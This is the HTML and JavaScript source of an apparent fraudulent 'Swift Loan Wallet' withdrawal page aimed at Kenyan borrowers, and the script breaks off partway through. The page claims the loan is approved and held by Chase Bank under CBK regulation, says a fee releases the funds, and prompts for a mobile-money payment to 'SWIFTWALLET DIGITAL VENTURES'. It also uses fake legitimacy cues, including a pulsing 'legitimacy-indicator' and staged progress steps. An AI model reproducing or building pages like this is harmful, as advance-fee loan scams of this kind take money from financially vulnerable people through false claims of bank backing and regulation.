<!DOCTYPE html>
<html lang="en-KE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Loan Withdrawal | Swift Loan - Withdraw your approved loan</title>
    <meta name="description" content="Withdraw your approved Swift Loan instantly. Secure loan disbursement process in Kenya.">
    
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#225AAC',
                        'primary-dark': '#1a4a8a',
                        'primary-light': '#e8f1ff'
                    }
                }
            }
        }
    </script>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        html {
            scroll-behavior: smooth;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #e8f1ff 0%, #f8faff 50%, #ffffff 100%);
            min-height: 100vh;
        }
        
        .swift-primary { color: #225AAC; }
        .swift-primary-bg { background-color: #225AAC; }
        .swift-primary-hover:hover { background-color: #1a4a8a; }
        .swift-primary-light { background-color: #e8f1ff; }
        
        .gradient-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8faff 100%);
            backdrop-filter: blur(10px);
        }
        
        .shadow-swift {
            box-shadow: 0 20px 40px -5px rgba(34, 90, 172, 0.15), 0 10px 20px -5px rgba(34, 90, 172, 0.1);
        }
        
        .transition-swift {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .pulse-ring {
            animation: pulse-ring 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) infinite;
        }

        @keyframes pulse-ring {
            0% {
                transform: scale(0.33);
            }
            40%, 50% {
                opacity: 1;
            }
            100% {
                opacity: 0;
                transform: scale(1.33);
            }
        }

        .bouncing-icon {
            animation: bounce-gentle 2s ease-in-out infinite;
        }

        @keyframes bounce-gentle {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        .slide-in {
            animation: slideIn 0.8s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .processing-animation {
            animation: processing 2s linear infinite;
        }

        @keyframes processing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .shake {
            animation: shake 0.5s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* Flowing arrow animation */
        .flowing-arrows {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .arrow-flow {
            animation: arrow-flow 2s ease-in-out infinite;
        }

        .arrow-flow:nth-child(2) {
            animation-delay: 0.3s;
        }

        .arrow-flow:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes arrow-flow {
            0%, 100% {
                opacity: 0.3;
                transform: translateX(-5px) scale(0.8);
            }
            50% {
                opacity: 1;
                transform: translateX(5px) scale(1.1);
            }
        }

        /* Modal styles */
        .modal-overlay {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
        }

        .modal-content {
            animation: modalSlideIn 0.4s cubic-bezier(0.23, 1, 0.320, 1) forwards;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        /* Form validation styles */
        .form-field {
            transition: all 0.3s ease;
        }

        .form-field:focus {
            border-color: #225AAC;
            box-shadow: 0 0 0 3px rgba(34, 90, 172, 0.1);
        }

        .form-field.error {
            border-color: #ef4444;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        .form-field.success {
            border-color: #10b981;
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
        }

        .error-message {
            color: #ef4444;
            font-size: 0.875rem;
            margin-top: 0.25rem;
        }

        /* Enhanced processing overlay */
        .processing-overlay-enhanced {
            background: linear-gradient(135deg, #225AAC 0%, #1a4a8a 100%);
            position: relative;
            overflow: hidden;
        }

        .processing-overlay-enhanced::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shimmer 3s ease-in-out infinite;
        }

        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }

        .legitimacy-indicator {
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
            .hero-title {
                font-size: 2rem;
                line-height: 1.2;
            }
            
            .modal-content {
                margin: 1rem;
                width: calc(100% - 2rem);
            }
        }

        .error-state {
            background: linear-gradient(135deg, #fee2e2 0%, #fef2f2 100%);
            border: 1px solid #fecaca;
        }

        .success-state {
            background: linear-gradient(135deg, #dcfce7 0%, #f0fdf4 100%);
            border: 1px solid #bbf7d0;
        }

        #successAlert,
        #errorAlert {
            scroll-margin-top: 90px;
        }

        /* Method selection cards */
        .method-card {
            transition: all 0.3s ease;
            cursor: pointer;
            border: 2px solid transparent;
        }

        .method-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .method-card.selected {
            border-color: #225AAC;
            background: linear-gradient(135deg, #e8f1ff 0%, #f0f8ff 100%);
        }

        /* Progress bar animation */
        .progress-bar-animated {
            background: linear-gradient(45deg, #10b981, #34d399);
            animation: progressFill 3s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        @media print {
          body * {
            visibility: hidden !important;
          }

          #receiptCardContainer, 
          #receiptCardContainer * {
            visibility: visible !important;
          }

          #receiptCardContainer {
            margin: 0 auto;
            padding: 20px !important;
            width: 100% !important;
            max-width: 800px;
            border: 1px solid #000;
            box-shadow: none !important;
          }

          #receiptCardContainer .print\:flex {
            display: flex !important;
          }

          #receiptCardContainer h2, 
          #receiptCardContainer h1 {
            font-size: 18pt !important;
            color: #000 !important;
          }
          #receiptCardContainer p, 
          #receiptCardContainer span {
            font-size: 11pt !important;
            color: #000 !important;
          }

          #receiptCardContainer a,
          #receiptCardContainer button {
            display: none !important;
          }
        }
    </style>
    
    <!-- Brevo Conversations {literal} -->
    <script>
        (function(d, w, c) {
            w.BrevoConversationsID = '67cfe70069e9058aa30db4b2';
            w[c] = w[c] || function() {
                (w[c].q = w[c].q || []).push(arguments);
            };
            var s = d.createElement('script');
            s.async = true;
            s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
            if (d.head) d.head.appendChild(s);
        })(document, window, 'BrevoConversations');
    </script>
    <!-- /Brevo Conversations {/literal} -->
</head>
<body class="bg-gradient-to-br from-blue-50 via-white to-blue-100">
    <!-- Header -->
    <header class="bg-white/80 backdrop-blur-md shadow-sm border-b border-gray-100 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <!-- Logo -->
                <div class="flex-shrink-0">
                    <div class="flex items-center">
                        <div class="w-10 h-10 swift-primary-bg rounded-lg flex items-center justify-center">
                            <!-- Loan Withdrawal Wallet SVG icon -->
                            <svg class="text-white" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
                                <!-- Wallet outline -->
                                <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 
                                         2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 
                                         10H5V9h16v8z"/>
                                <!-- Downward arrow (withdrawal) -->
                                <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 
                                         7l-2 2V3h-2z"/>
                                <!-- Small circle as wallet button -->
                                <circle cx="17" cy="13" r="1"/>
                            </svg>
                        </div>
                        <span class="ml-3 text-xl font-bold text-gray-900">Swift Loan Wallet</span>
                    </div>
                </div>

                <!-- Action Buttons -->
                <div class="flex items-center space-x-3">
                    <button onclick="showBalanceInfo()" class="bg-green-100 text-green-800 px-4 py-2 text-sm font-medium rounded-md transition-swift hover:bg-green-200">
                        <i class="fas fa-wallet mr-1"></i> Balance
                    </button>
                    <button onclick="goBack()" class="border border-primary text-primary hover:bg-primary hover:bg-opacity-10 px-4 py-2 text-sm font-medium rounded-md transition-swift">
                        <i class="fas fa-arrow-left mr-1"></i> 
                    </button>
                </div>
            </div>
        </div>
    </header>
    
    <!-- Main Content -->
    <main class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Page Header -->
        <div class="text-center mb-8 slide-in">
            <div class="inline-flex items-center px-4 py-2 bg-green-100 text-green-800 rounded-full text-sm font-medium mb-6">
                <i class="fas fa-check-circle mr-2"></i>
                Loan Transfer to wallet was Successfull & Ready for Withdrawal.
                powered by CHASEBANK and regulated by CBK
            </div>

            <h1 class="hero-title text-3xl lg:text-4xl font-bold text-gray-900 leading-tight mb-4">
                Withdraw Your 
                <span class="swift-primary">Loan Funds Instantly</span>
            </h1>
            <p class="text-lg text-gray-600 max-w-2xl mx-auto">
                Your loan has been approved and is ready for instant withdrawal to your preferred account.Contact our support team through the blue chat message button at the bottom right.,we are always online 24/7.note that for repayment will be done at the repayment period,we have your details for follow up.
            </p>
        </div>

        <!-- Error Alert (Hidden by default) -->
        <div id="errorAlert" class="hidden mb-8 error-state rounded-2xl p-6 slide-in">
            <div class="flex items-start space-x-3">
                <i class="fas fa-exclamation-triangle text-red-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div>
                    <h3 class="text-lg font-semibold text-red-800 mb-2">Transaction Failed</h3>
                    <p id="errorMessage" class="text-red-700 text-sm"></p>
                    <button onclick="hideError()" class="mt-3 text-red-600 hover:text-red-800 text-sm font-medium underline">
                        Dismiss
                    </button>
                </div>
            </div>
        </div>

        <!-- Success Alert (Hidden by default) -->
        <div id="successAlert" class="hidden mb-8 success-state rounded-2xl p-6 slide-in bg-green-100 border border-green-300">
            <div class="flex items-start space-x-3">
                <i class="fas fa-check-circle text-green-600 text-xl mt-0.5 flex-shrink-0"></i>
                <div class="w-full">
                    <h3 id="successHeading" class="text-lg font-semibold text-green-800 mb-2">Withdrawal Successfully Initiated!</h3>
                    <p id="successMessage" class="text-green-700 text-sm mb-3"></p>

                    <!-- Progress Bar -->
                    <div class="w-full bg-gray-200 rounded-full h-5 overflow-hidden relative mb-4">
                        <div id="progressBar" class="bg-green-600 h-5 w-0 transition-all duration-200"></div>
                        <span id="progressText" 
                              class="absolute inset-0 flex items-center justify-center text-xs font-medium text-white">
                              Processing previous withdrawal...
                        </span>
                    </div>
                    
                    <!-- Receipt Card (appears after withdrawal initiated) -->
                    <div id="receiptCardContainer" class="mt-6"></div>
                    
                    <!-- Need Help Link -->
                    <div class="text-center mt-4">
                        <button 
                            onclick="openHelpModal()" 
                            class="text-sm font-medium text-blue-600 hover:text-blue-800 underline">
                            Need help? Verify Transaction 
                        </button>
                    </div>
                    
                    <!-- Logos Row with Arrow Transfer Animation -->
                    <div class="flex justify-center items-center space-x-8 mt-4">
                        <!-- Swift Wallet Logo -->
                        <div class="flex flex-col items-center">
                            <div class="w-12 h-12 bg-primary rounded-lg flex items-center justify-center">
                                <i class="fas fa-wallet text-white text-xl"></i>
                            </div>
                            <span class="text-xs text-gray-700 mt-1 font-medium">Swift Wallet</span>
                        </div>

                        <!-- Transfer Animation (Flowing Arrows) -->
                        <div class="flowing-arrows">
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                            <i class="fas fa-arrow-right text-green-600 text-lg arrow-flow"></i>
                        </div>

                        <!-- Selected Method Logo -->
                        <div class="flex flex-col items-center">
                            <div id="selectedMethodLogo" class="w-12 h-12 bg-green-600 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-white text-xl"></i>
                            </div>
                            <span id="selectedMethodName" class="text-xs text-gray-700 mt-1 font-medium">M-Pesa</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Loan Summary Card -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-2xl font-bold text-gray-900">Loan Summary</h2>
                <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">
                    <i class="fas fa-check mr-1"></i> APPROVED
                </div>
            </div>

            <div class="grid md:grid-cols-2 gap-8">
                <!-- Customer Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Customer Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Full Name:</span>
                            <span id="customerName" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Phone Number:</span>
                            <span id="customerPhone" class="font-semibold text-gray-900">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan ID:</span>
                            <span id="loanId" class="font-semibold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>

                <!-- Loan Details -->
                <div class="space-y-4">
                    <h3 class="text-lg font-semibold text-gray-800 mb-4">Loan Details</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between">
                            <span class="text-gray-600">Loan Amount:</span>
                            <span id="loanAmount" class="font-bold text-green-600">Loading...</span>
                        </div>
                        <div class="flex justify-between">
                            <span class="text-gray-600">Processing Fee:</span>
                            <span id="processingFee" class="font-semibold text-orange-600">Loading...</span>
                        </div>
                        <div class="flex justify-between pt-3 border-t border-gray-200">
                            <span class="text-lg font-bold text-gray-900">Available Balance:</span>
                            <span id="availableBalance" class="text-2xl font-bold text-primary">Loading...</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Withdrawal Section -->
        <div class="gradient-card rounded-2xl shadow-swift p-8 mb-8 slide-in border border-white/50">
            <div class="text-center mb-8">
                <div class="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4 bouncing-icon">
                    <i class="fas fa-money-bill-transfer text-primary text-2xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-gray-900 mb-2">Withdraw My Loan</h2>
                <p class="text-gray-600">Choose your preferred withdrawal method and complete the process</p>
            </div>

            <!-- Withdrawal Amount Display -->
            <div class="bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-6 mb-8 text-center border-2 border-green-200 shadow-sm">
                <div class="flex items-center justify-center mb-3">
                    <i class="fas fa-coins text-green-600 text-lg mr-2"></i>
                    <div class="text-sm font-medium text-green-900">Verified Withdrawal Amount</div>
                </div>
                <div id="withdrawalAmount" class="text-4xl font-bold text-green-700 mb-2">Loading...</div>
                <div class="text-sm text-gray-600 mb-2">
                    <i class="fas fa-info-circle mr-1"></i>
                    <span id="feeNotice">Actual amount approved; withdrawable</span>
                </div>
                <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                    <span>
                        <i class="fas fa-university mr-1"></i>
                        Chase Bank LMTD
                    </span>
                    <span>•</span>
                    <span>
                        <i class="fas fa-shield-alt mr-1"></i>
                        Approved amount
                    </span>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="flex flex-col sm:flex-row gap-4">
                <button 
                    onclick="goBack()"
                    class="flex-1 px-8 py-4 border-2 border-gray-300 text-gray-700 font-semibold rounded-xl hover:bg-gray-50 transition-swift flex items-center justify-center"
                >
                    <i class="fas fa-arrow-left mr-2"></i>
                    Cancel
                </button>
                <button 
                    onclick="showWithdrawalMethods()"
                    id="withdrawBtn"
                    class="flex-1 px-8 py-4 bg-gradient-to-r from-primary to-blue-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-blue-700 transition-swift flex items-center justify-center shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
                >
                    <i class="fas fa-wallet mr-2"></i>
                    <span id="withdrawText">Choose Withdrawal Method</span>
                </button>
            </div>

            <!-- Important Notice -->
            <div class="mt-8 bg-blue-50 border border-blue-200 rounded-xl p-4">
                <div class="flex items-start space-x-3">
                    <i class="fas fa-info-circle text-blue-600 mt-0.5 flex-shrink-0"></i>
                    <div class="text-sm text-blue-800">
                        <p class="font-semibold mb-2"><i class="fas fa-lightbulb mr-1"></i> Important Information:</p>
                        <ul class="space-y-1 text-xs">
                            <li>• Choose from M-Pesa, Airtel Money, or Bank Transfer</li>
                            <li>• All withdrawal methods are secure and encrypted</li>
                            <li>• Funds will be credited to your account.check updates in the system generated receipt</li>
                            <li>• Keep your phone nearby for confirmation process</li>
                            <li>• You will receive SMS confirmation once completed</li>
                            <li>• Verify your details carefully before proceeding</li>
                            <li>• NOTE that all your loan funds are securely held by Chase Bank regulated by CBK. Fee securely releases the funds to your M-Pesa, Airtel Money and Bank accounts</li>
                            <li>• If you encounter any problem don't hesitate to contact our support team through the blue chat widget at the bottom right side. We are always online</li>
                            <li>• The live loan receipt is possessed by our loan systems and shows the current status of the applicant loan. If you get any problem, download the PDF receipt and send to live support for assistance</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- Quick Links Section -->
        <div class="gradient-card rounded-2xl shadow-swift p-6 mb-8 slide-in border border-white/50">
            <h3 class="text-lg font-semibold text-gray-800 mb-4">
                <i class="fas fa-link mr-2 text-primary"></i>Quick Links
            </h3>
            <div class="grid md:grid-cols-3 gap-4">
                <a href="#" onclick="openHelpModal(); return false;" class="flex items-center p-3 bg-blue-50 rounded-lg hover:bg-blue-100 transition-swift">
                    <i class="fas fa-headset text-blue-600 text-xl mr-3"></i>
                    <span class="text-sm font-medium text-gray-700">Contact Support</span>
                </a>
                <a href="#" onclick="showTransactionHistory(); return false;" class="flex items-center p-3 bg-green-50 rounded-lg hover:bg-green-100 transition-swift">
                    <i class="fas fa-history text-green-600 text-xl mr-3"></i>
                    <span class="text-sm font-medium text-gray-700">Transaction History</span>
                </a>
                <a href="#" onclick="showFAQ(); return false;" class="flex items-center p-3 bg-purple-50 rounded-lg hover:bg-purple-100 transition-swift">
                    <i class="fas fa-question-circle text-purple-600 text-xl mr-3"></i>
                    <span class="text-sm font-medium text-gray-700">FAQ</span>
                </a>
            </div>
        </div>
    </main>

    <!-- Withdrawal Method Modal -->
    <div id="withdrawalMethodModal" class="hidden fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm z-50 items-center justify-center p-4">
        <div class="bg-white rounded-2xl shadow-2xl max-w-2xl w-full p-8 modal-content">
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-2xl font-bold text-gray-900">
                    <i class="fas fa-wallet text-primary mr-2"></i>Select Withdrawal Method
                </h2>
                <button onclick="closeWithdrawalModal()" class="text-gray-400 hover:text-gray-600 transition-swift">
                    <i class="fas fa-times text-2xl"></i>
                </button>
            </div>

            <div class="space-y-4">
                <!-- M-Pesa Method -->
                <div class="method-card bg-white border-2 border-gray-200 rounded-xl p-6 hover:shadow-lg transition-swift" onclick="selectMethod('mpesa')">
                    <div class="flex items-center justify-between">
                        <div class="flex items-center space-x-4">
                            <div class="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-green-600 text-xl"></i>
                            </div>
                            <div>
                                <h3 class="text-lg font-semibold text-gray-900">M-Pesa</h3>
                                <p class="text-sm text-gray-600">Instant mobile money transfer</p>
                                <p class="text-xs text-green-600 font-medium mt-1">Most Popular • Withdrawal updates in receipt</p>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-primary text-xl"></i>
                    </div>
                </div>

                <!-- Airtel Money Method -->
                <div class="method-card bg-white border-2 border-gray-200 rounded-xl p-6 hover:shadow-lg transition-swift" onclick="selectMethod('airtel')">
                    <div class="flex items-center justify-between">
                        <div class="flex items-center space-x-4">
                            <div class="w-12 h-12 bg-red-100 rounded-lg flex items-center justify-center">
                                <i class="fas fa-mobile-alt text-red-600 text-xl"></i>
                            </div>
                            <div>
                                <h3 class="text-lg font-semibold text-gray-900">Airtel Money</h3>
                                <p class="text-sm text-gray-600">Mobile money transfer</p>
                                <p class="text-xs text-red-600 font-medium mt-1">Fast • Withdrawal updates in receipt</p>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-primary text-xl"></i>
                    </div>
                </div>

                <!-- Bank Transfer Method -->
                <div class="method-card bg-white border-2 border-gray-200 rounded-xl p-6 hover:shadow-lg transition-swift" onclick="selectMethod('bank')">
                    <div class="flex items-center justify-between">
                        <div class="flex items-center space-x-4">
                            <div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
                                <i class="fas fa-university text-blue-600 text-xl"></i>
                            </div>
                            <div>
                                <h3 class="text-lg font-semibold text-gray-900">Bank Transfer</h3>
                                <p class="text-sm text-gray-600">Direct transfer to your bank account</p>
                                <p class="text-xs text-blue-600 font-medium mt-1">Secure • Withdrawal updates in receipt</p>
                            </div>
                        </div>
                        <i class="fas fa-chevron-right text-primary text-xl"></i>
                    </div>
                </div>
            </div>

            <div class="mt-6 bg-gray-50 rounded-lg p-4 text-center">
                <i class="fas fa-shield-alt text-green-600 mr-2"></i>
                <span class="text-sm text-gray-600">Secure & Encrypted - All transactions are protected with bank-level security and 256-bit encryption</span>
            </div>
        </div>
    </div>

    <!-- Withdrawal Details Modal -->
    <div id="withdrawalDetailsModal" class="hidden fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm z-50 items-center justify-center p-4 overflow-y-auto">
        <div class="bg-white rounded-2xl shadow-2xl max-w-lg w-full p-8 modal-content my-8">
            <div class="flex justify-between items-center mb-6">
                <h2 id="detailsModalTitle" class="text-2xl font-bold text-gray-900">Withdrawal Details</h2>
                <button onclick="closeDetailsModal()" class="text-gray-400 hover:text-gray-600 transition-swift">
                    <i class="fas fa-times text-2xl"></i>
                </button>
            </div>

            <div id="withdrawalForm">
                <!-- Form will be populated dynamically -->
            </div>

            <button onclick="processWithdrawal()" class="w-full mt-6 px-8 py-4 bg-gradient-to-r from-primary to-blue-600 text-white font-bold rounded-xl hover:from-primary-dark hover:to-blue-700 transition-swift flex items-center justify-center shadow-lg">
                <i class="fas fa-check-circle mr-2"></i>
                Confirm Withdrawal
            </button>
        </div>
    </div>

    <!-- Processing Overlay (Enhanced Blue Modal) -->
    <div id="processingOverlay" class="hidden fixed inset-0 z-[100]">
        <div class="processing-overlay-enhanced w-full h-full flex items-center justify-center p-4">
            <div class="max-w-2xl w-full bg-white/10 backdrop-blur-sm rounded-2xl p-8 text-center">
                <div class="mb-6">
                    <div class="w-20 h-20 border-4 border-white/30 border-t-white rounded-full processing-animation mx-auto mb-4"></div>
                    <h2 class="text-3xl font-bold text-white mb-4">
                        <i class="fas fa-wallet mr-2"></i>Swift Loan Wallet
                    </h2>
                    <p class="text-white/90 text-lg mb-2">Loan Transfer to wallet was Successful & Ready for Withdrawal.</p>
                    <p class="text-white/80 text-sm">powered by CHASEBANK and regulated by CBK</p>
                </div>

                <div class="bg-white/10 rounded-xl p-6 mb-6">
                    <h3 class="text-xl font-bold text-white mb-4">Processing Your Loan Withdrawal</h3>
                    
                    <div class="space-y-3 text-left">
                        <div id="step1" class="flex items-center text-white/70">
                            <i class="fas fa-circle-notch fa-spin mr-3"></i>
                            <span id="step1Text">Initializing secure connection...</span>
                        </div>
                        <div id="step2" class="flex items-center text-white/70">
                            <i class="fas fa-circle mr-3"></i>
                            <span id="step2Text">Waiting...</span>
                        </div>
                        <div id="step3" class="flex items-center text-white/70">
                            <i class="fas fa-circle mr-3"></i>
                            <span id="step3Text">Waiting...</span>
                        </div>
                    </div>
                </div>

                <div class="bg-yellow-500/20 border border-yellow-400/30 rounded-lg p-4 mb-6 legitimacy-indicator">
                    <p class="text-white font-semibold text-lg mb-2">
                        <i class="fas fa-mobile-alt mr-2"></i>Please check your phone
                    </p>
                    <p class="text-white/90 text-sm">
                        for the payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>
                    </p>
                </div>

                <div class="bg-white/5 rounded-lg p-4 text-white/80 text-sm space-y-2">
                    <p><i class="fas fa-shield-alt mr-2 text-green-400"></i>Bank Grade Security • 256-bit Encryption • Licensed by CBK</p>
                    <p><i class="fas fa-lock mr-2 text-blue-400"></i>Validating • Processing • Confirming</p>
                    <p class="text-white/60 text-xs mt-3">Powered by CHASEBANK</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Help Modal -->
    <div id="helpModal" class="hidden fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm z-50 items-center justify-center p-4">
        <div class="bg-white rounded-2xl shadow-2xl max-w-lg w-full p-8 modal-content">
            <div class="flex justify-between items-center mb-6">
                <h2 class="text-2xl font-bold text-gray-900">
                    <i class="fas fa-headset text-primary mr-2"></i>Need Help?
                </h2>
                <button onclick="closeHelpModal()" class="text-gray-400 hover:text-gray-600 transition-swift">
                    <i class="fas fa-times text-2xl"></i>
                </button>
            </div>

            <div class="space-y-4">
                <div class="bg-blue-50 rounded-lg p-4">
                    <h3 class="font-semibold text-gray-900 mb-2">Contact Support</h3>
                    <p class="text-sm text-gray-600 mb-3">Our support team is available 24/7 through the blue chat widget at the bottom right of your screen.</p>
                    <button class="text-primary font-medium text-sm hover:underline">
                        <i class="fas fa-comments mr-1"></i>Open Chat Support
                    </button>
                </div>

                <div class="bg-green-50 rounded-lg p-4">
                    <h3 class="font-semibold text-gray-900 mb-2">Transaction Verification</h3>
                    <p class="text-sm text-gray-600 mb-2">If you need to verify your transaction, download the PDF receipt and send it to our support team.</p>
                </div>

                <div class="bg-purple-50 rounded-lg p-4">
                    <h3 class="font-semibold text-gray-900 mb-2">Common Questions</h3>
                    <ul class="text-sm text-gray-600 space-y-2">
                        <li><i class="fas fa-check text-purple-600 mr-2"></i>Withdrawal takes 2-5 minutes</li>
                        <li><i class="fas fa-check text-purple-600 mr-2"></i>All transactions are secure and encrypted</li>
                        <li><i class="fas fa-check text-purple-600 mr-2"></i>SMS confirmation will be sent</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-primary text-white py-8 mt-12">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="text-center">
                <div class="flex items-center justify-center mb-4">
                    <div class="w-10 h-10 bg-white rounded-lg flex items-center justify-center mr-3">
                        <svg class="text-primary" fill="currentColor" height="20" width="20" viewBox="0 0 24 24">
                            <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 
                                     2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 
                                     10H5V9h16v8z"/>
                            <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 
                                     7l-2 2V3h-2z"/>
                            <circle cx="17" cy="13" r="1"/>
                        </svg>
                    </div>
                    <span class="text-xl font-bold">Swift Loan Wallet</span>
                </div>
                <p class="text-white/80 mb-4">Secure, Fast, and Reliable Loan Services</p>
                <p class="text-white/60 text-sm">&copy; 2025 Swift Loan Wallet. All rights reserved.</p>
                <p class="text-white/60 text-xs mt-2">Powered by CHASEBANK • Regulated by CBK • Licensed Money Lender</p>
            </div>
        </div>
    </footer>

    <script>
        // Global variables
        let loanData = {};
        let selectedWithdrawalMethod = '';
        let isProcessing = false;

        // Kenyan Banks List
        const kenyanBanks = [
            "Equity Bank (247247)",
            "KCB Bank (522522)",
            "Cooperative Bank (400200)",
            "NCBA Bank (654321)",
            "Absa Bank (303030)",
            "Standard Chartered (329329)",
            "DTB (380380)",
            "I&M Bank (975975)",
            "Stanbic Bank (225225)",
            "Family Bank (222111)",
            "Chase Bank (898898)"
        ];

        // Helper function for delays
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Go back function
        function goBack() {
            window.history.back();
        }

        // Show balance info
        function showBalanceInfo() {
            const balance = document.getElementById('availableBalance').textContent;
            alert(`Your Available Balance: ${balance}\n\nThis is the amount you can withdraw after processing fees.`);
        }

        // Load loan data on page load
        window.addEventListener('DOMContentLoaded', () => {
            loadLoanData();
        });

        function loadLoanData() {
            try {
                const selectedOffer = localStorage.getItem('swiftloan_selected_offer');
                const customerName = localStorage.getItem('swift_customer_name') || 'Valued Customer';

                if (!selectedOffer) {
                    showError('No loan data found. Please go back and select a loan offer.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                loanData = JSON.parse(selectedOffer);
                console.log('Loaded loan data:', loanData);

                if (!loanData.amount || !loanData.fee || !loanData.phone || !loanData.tracking) {
                    showError('Invalid loan data. Please go back and select a loan offer again.');
                    document.getElementById('withdrawBtn').disabled = true;
                    return;
                }

                const loanAmount = parseFloat(loanData.amount);
                const feeAmount = parseFloat(loanData.fee);
                const availableBalance = loanAmount - feeAmount;

                // Update customer details
                document.getElementById('customerName').textContent = customerName;
                document.getElementById('customerPhone').textContent = loanData.phone;
                document.getElementById('loanId').textContent = loanData.tracking;

                // Update loan details
                document.getElementById('loanAmount').textContent = `KES ${loanAmount.toLocaleString()}`;
                document.getElementById('processingFee').textContent = `KES ${feeAmount.toLocaleString()}`;
                document.getElementById('availableBalance').textContent = `KES ${availableBalance.toLocaleString()}`;
                document.getElementById('withdrawalAmount').textContent = `KES ${availableBalance.toLocaleString()}`;

                console.log('Loan data loaded successfully');
            } catch (error) {
                console.error('Error loading loan data:', error);
                showError('Failed to load loan information. Please try again.');
                document.getElementById('withdrawBtn').disabled = true;
            }
        }

        // Show withdrawal methods modal
        function showWithdrawalMethods() {
